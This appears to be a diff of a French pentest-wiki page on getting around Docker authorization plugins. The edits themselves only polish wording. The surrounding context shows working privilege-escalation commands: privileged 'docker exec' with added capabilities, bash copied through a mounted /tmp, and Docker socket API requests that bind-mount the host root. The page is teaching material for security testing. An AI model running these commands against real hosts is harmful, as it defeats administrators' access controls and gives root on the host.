@@ -8,7 +8,7 @@ Les plugins d'authentification Docker sont des **plugins externes** que vous pou
 
 **[Les informations suivantes proviennent de la documentation](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**
 
-Lorsqu'une **demande HTTP** est faite au **démon** Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** **transmet** la demande au(x) **plugin(s)** d'**authentification** installés. La demande contient l'utilisateur (appelant) et le contexte de la commande. Le **plugin** est responsable de décider s'il faut **autoriser** ou **refuser** la demande.
+Lorsqu'une **demande HTTP** est faite au **démon** Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** **transmet** la demande aux **plugins d'authentification** installés. La demande contient l'utilisateur (appelant) et le contexte de la commande. Le **plugin** est responsable de décider s'il faut **autoriser** ou **refuser** la demande.
 
 Les diagrammes de séquence ci-dessous illustrent un flux d'autorisation d'autorisation et de refus :
 
@@ -58,7 +58,7 @@ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubunt
 ```
 ### Exécution d'un conteneur puis obtention d'une session privilégiée
 
-Dans ce cas, l'administrateur système **a interdit aux utilisateurs de monter des volumes et d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur :
+Dans ce cas, l'administrateur système **a interdit aux utilisateurs de monter des volumes et d'exécuter des conteneurs avec le `--privileged` flag** ou de donner des capacités supplémentaires au conteneur :
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
@@ -76,11 +76,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
-Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques précédemment discutées**](./#privileged-flag) et **escalader les privilèges** à l'intérieur de l'hôte.
+Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques discutées précédemment**](./#privileged-flag) et **escalader les privilèges** à l'intérieur de l'hôte.
 
 ## Monter un Dossier Écrivable
 
-Dans ce cas, l'administrateur système **a interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner une capacité supplémentaire au conteneur, et il a seulement autorisé à monter le dossier `/tmp` :
+Dans ce cas, l'administrateur système **a interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur, et il a seulement autorisé à monter le dossier `/tmp` :
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -118,7 +118,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
 > [!WARNING]
-> Notez comment dans cet exemple nous utilisons le **`Binds`** paramètre comme une clé de niveau racine dans le JSON mais dans l'API, il apparaît sous la clé **`HostConfig`**
+> Notez comment dans cet exemple nous utilisons le paramètre **`Binds`** comme une clé de niveau racine dans le JSON mais dans l'API, il apparaît sous la clé **`HostConfig`**
 
 ### Binds dans HostConfig
 
@@ -128,7 +128,7 @@ curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '
 ```
 ### Montages dans la racine
 
-Suivez les mêmes instructions que pour **Binds dans la racine** en effectuant cette **demande** à l'API Docker :
+Suivez les mêmes instructions que pour **Liens dans la racine** en effectuant cette **demande** à l'API Docker :
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
